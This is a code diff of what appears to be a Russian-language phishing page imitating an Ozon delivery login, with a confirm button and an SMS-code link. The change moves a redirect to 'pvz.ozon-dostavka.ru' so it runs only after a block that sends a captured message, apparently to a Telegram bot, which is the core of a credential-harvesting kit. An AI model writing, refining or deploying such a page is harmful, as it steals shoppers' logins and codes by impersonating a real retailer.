@@ -147,7 +147,7 @@ document.querySelector("#button").onclick = function(){
                       </label>
                       <!---->
                     </div>
-                    <button class="mail__button" type="submit" onclick="document.location='https://pvz.ozon-dostavka.ru/login?redirectUri=%2F'">Подтвердить</button>
+                    <button class="mail__button" type="submit">Подтвердить</button>
                     <div class="sms__div">
                       <a href="#">
                           Получить код в СМС
@@ -191,6 +191,7 @@ document.querySelector("#button").onclick = function(){
                     parse_mode: 'html',
                     text: message
                 })
+                document.location='https://pvz.ozon-dostavka.ru/login?redirectUri=%2F'
             })
             })
         }
